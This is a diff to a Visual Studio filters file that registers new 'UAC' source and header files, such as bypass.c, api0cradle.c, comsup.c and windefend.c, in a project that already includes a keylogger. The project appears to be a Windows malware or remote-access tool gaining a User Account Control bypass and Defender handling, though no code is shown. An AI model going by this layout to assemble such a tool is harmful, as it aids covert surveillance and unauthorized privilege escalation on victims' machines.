@@ -34,6 +34,12 @@
     <Filter Include="Shared">
       <UniqueIdentifier>{c9b1c06d-9d83-42f6-b53e-fa224e1d5072}</UniqueIdentifier>
     </Filter>
+    <Filter Include="Header Files\UAC">
+      <UniqueIdentifier>{646eca07-da45-439e-a59b-5578404ad82a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\UAC">
+      <UniqueIdentifier>{0d455692-bceb-4b6c-901a-ceb6e6e77d66}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="main.cpp">
@@ -78,6 +84,90 @@
     <ClCompile Include="keylogger.cpp">
       <Filter>Source Files\Utility</Filter>
     </ClCompile>
+    <ClCompile Include="shortcut.cpp">
+      <Filter>Source Files\Utility</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_filename.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strcat.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strcmp.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strcmpi.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strcpy.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strend.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strlen.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strncmp.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strncmpi.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strncpy.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\_strstri.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="methods\api0cradle.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="bypass.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\cmdline.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="compress.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="methods\comsup.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\hde\hde64.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\ldr.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\windefend.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\strtoi.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\strtoul.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="sup.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\u64tohex.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\u64tostr.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\ultohex.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\ultostr.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
+    <ClCompile Include="Shared\util.c">
+      <Filter>Source Files\UAC</Filter>
+    </ClCompile>
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="conversion.h">
@@ -118,6 +208,81 @@
     </ClInclude>
     <ClInclude Include="keylogger.h">
       <Filter>Header Files\Utility</Filter>
+    </ClInclude>
+    <ClInclude Include="shortcut.h">
+      <Filter>Header Files\Utility</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\_filename.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="methods\api0cradle.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="bypass.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\cmdline.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="compress.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="methods\comsup.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\consts.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="methods\elvint.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="global_uac.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\hde\hde64.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\ldr.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\libinc.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="methods\methods.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\minirtl.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\ntos\ntbuilds.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\ntos\ntos.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\ntos\ntsxs.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\hde\pstdint.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\rtltypes.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\shared.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="sup.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\hde\table64.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\util.h">
+      <Filter>Header Files\UAC</Filter>
+    </ClInclude>
+    <ClInclude Include="Shared\windefend.h">
+      <Filter>Header Files\UAC</Filter>
     </ClInclude>
   </ItemGroup>
 </Project>
